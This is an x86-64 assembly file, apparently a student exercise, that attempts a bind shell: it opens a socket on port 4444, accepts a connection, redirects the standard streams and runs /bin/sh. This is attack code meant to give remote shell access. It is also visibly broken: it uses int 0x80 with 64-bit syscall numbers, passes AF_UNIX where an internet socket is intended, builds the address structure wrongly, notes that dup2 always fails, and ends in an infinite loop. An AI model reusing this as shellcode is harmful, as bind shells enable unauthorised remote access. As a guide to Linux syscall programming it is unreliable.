;PEX1
;Garret M. Gwozdz
;Documentation: https://gist.github.com/geyslan/5174296 , I used this as a a guideline of what I needed to do. Its in x86 32 so all the syscalls were different in execution but I think they were in the right orde, maybe.


SECTION .text
    global _start
_start:
    ;a. Create a Stream Socket
    mov rax, 41     ; syscall 41 - socketcall
    mov rdi, 1      ; family: AF_UNIX 1 local to host (pipes, portals)
    mov rsi, 1      ; type: SOCK_STREAM 1 stream socket
    mov rdx, 0      ; Protocol: IPPROTO_IP 0
    int 0x80        ; interupt

    mov r11, -1     ;puts -1 into r11 in order to check if 
    cmp r11, rax    ;rax is -1 which is an error
    jz end          ;checks to see if socket was created
                    ;if not then it jumps to the end
    mov rcx, rax    ;saving the returned socket file descriptor    

    mov rax, 41     ; syscall 41 - socketcall
    mov rbx, 2      ; socketcall type (sys_bind 2)

    ;b. build a sockaddr_in structure
    push BYTE 0     ;INADDR_ANY = 0 (8 bits)
    push WORD 0x5C11;port in byte reverse order (2 bytes)
    push WORD 1     ;AF_UNIX = 1 (2 bytes)
    mov rsi, rsp   ; stores struct address in RSI

    ;bind arguments
    mov rdi, rcx    ;socket fd (int)
    mov rsi, rsp    ;pointer to sockaddr_in
    mov rdx, 16     ;len of sockaddr_in

    int 0x80        ;interupt

    cmp r11, rax    ;rax is -1 which is an error
    jz end          ;checks to see if socket was created
                    ;if not then it jumps to the end

    ;prepare to listen
    mov rax, 41     ;syscall 41 - socketcall
    mov rbx, 4      ;socketcall type (sys_listen 4)

    mov rdi, rcx    ;socket address
    mov rsi, 0      ;backlog (connections queue size)

    int 0x80        ;interupt
    cmp r11, rax    ;if rax is -1 its an error
    jz end          ; and i want to jump if its an error

    ;accept incoming traffic
    mov rax, 41     ;syscall 41 -socketcall
    mov rbx, 5      ;socketcall type (sys_accept 5)
    
    mov rdi, rcx    ; socket addres
    mov rsi, 0      ;null

    int 0x80        ;interupt
    cmp r11, rax    ;if rax is 01 its an error
    jz end          ; and i want to jump if its an error

    mov rdi, rax   ;mov oldfd to rdi to be used next  

    ;duplicating the file descriptors so they can be redirrected to the socket
    ;THIS DOESNT WORK, IT RETURNS -13 EVERY TIME
    mov rax, 33     ;sys_dup2
    mov rsi, 0x00   ;stdin file descriptor

    int 0x80        ;interupt
  
    mov rax, 33     ;sys_dup2
    mov rsi, 0x01   ;stdout file desciptor
   
    int 0x80        ;interupt

    mov rax, 33     ;sys_dup2
    mov rsi, 0x02   ;stderr file descriptor
    
    int 0x80        ;interupt

    ;execute a shell (/bin/sh)
    mov rax, 59     ;syscall
    
    push 0          ;null byte
    push 0x68732f2f ; "//sh"
    push 0x6e69622f ;"/bin"

    mov rdi, rsp    ;ptr to "/bin//sh" string
    mov rsi, 0      ;null argv
    mov rdx, 0      ;null encp

    int 0x80

end:
    nop
    mov rax, 41     ; syscall 41 - socketcall
    mov rbx, 2      ; socketcall type (sys_shutdown 2)

    mov rdi, rdx    ; socket address
    mov rsi, 2      ; shutdown all

    test rax, rax   ; test to make sure it works
    jz end
